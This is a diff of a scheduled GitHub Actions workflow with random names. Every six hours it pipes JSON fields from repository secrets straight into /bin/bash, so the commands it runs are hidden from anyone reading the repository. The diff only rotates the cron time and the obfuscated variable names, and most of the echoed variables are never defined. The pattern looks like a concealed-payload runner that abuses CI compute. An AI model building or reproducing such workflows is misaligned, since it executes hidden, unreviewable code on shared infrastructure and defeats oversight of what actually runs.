@@ -2,35 +2,32 @@ name: majhabnk
 on:
   workflow_dispatch:
   schedule:
-    - cron: '37 3/6 * * *'
-
+    - cron: '48 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: majhabnk
         env:
-          cuz041: ${{ secrets.cuz041 }}
+          zi70887: ${{ secrets.zi70887 }}
         run: |
-          echo $cuz041 | jq -r .odabw8 | /bin/bash
-          echo $n561 | jq -r .zqq0997 | /bin/bash
-          echo $iqlut5117 | jq -r .qnmt3 | /bin/bash
-          echo $exytr6 | jq -r .ie99 | /bin/bash
-          echo $foz116 | jq -r .b274 | /bin/bash
-          echo $xz68724 | jq -r .zpw8303 | /bin/bash
-          echo $ot694 | jq -r .r1 | /bin/bash
-          echo $fmhs3 | jq -r .nue7 | /bin/bash
-          echo $uindk2853 | jq -r .zq98737 | /bin/bash
-          echo $e61 | jq -r .aqmy7 | /bin/bash
-          echo $gdeh3835 | jq -r .chuca78327 | /bin/bash
-          echo $y9 | jq -r .bt39622 | /bin/bash
-          echo $ceadv6247 | jq -r .xkk6656 | /bin/bash
-          echo $fsdrl4830 | jq -r .ni42 | /bin/bash
-          echo $fwk91 | jq -r .jsdn9 | /bin/bash
-          echo $emlny0668 | jq -r .b07 | /bin/bash
-          echo $cv744 | jq -r .md9 | /bin/bash
-          echo $fj67 | jq -r .bxbr36049 | /bin/bash
-          echo $ca745 | jq -r .iqypg26460 | /bin/bash
-          echo $mst3795 | jq -r .g271 | /bin/bash
+          echo $zi70887 | jq -r .scgdg25 | /bin/bash
+          echo $zek2190 | jq -r .yx75 | /bin/bash
+          echo $akevd92 | jq -r .qt39096 | /bin/bash
+          echo $m3 | jq -r .urp496 | /bin/bash
+          echo $u3 | jq -r .kl15503 | /bin/bash
+          echo $avi799 | jq -r .ybk94721 | /bin/bash
+          echo $d1 | jq -r .zeao2 | /bin/bash
+          echo $qjaey243 | jq -r .pchg708 | /bin/bash
+          echo $te236 | jq -r .keif0 | /bin/bash
+          echo $kdk22754 | jq -r .se81076 | /bin/bash
+          echo $ael18385 | jq -r .fnmn308 | /bin/bash
+          echo $aows802 | jq -r .utm6440 | /bin/bash
+          echo $wzvmf9293 | jq -r .eb48882 | /bin/bash
+          echo $ruen7 | jq -r .v4 | /bin/bash
+          echo $dhkp20373 | jq -r .ixm63 | /bin/bash
+          echo $flz6753 | jq -r .ikp41408 | /bin/bash
+          echo $z5 | jq -r .ms634 | /bin/bash
 
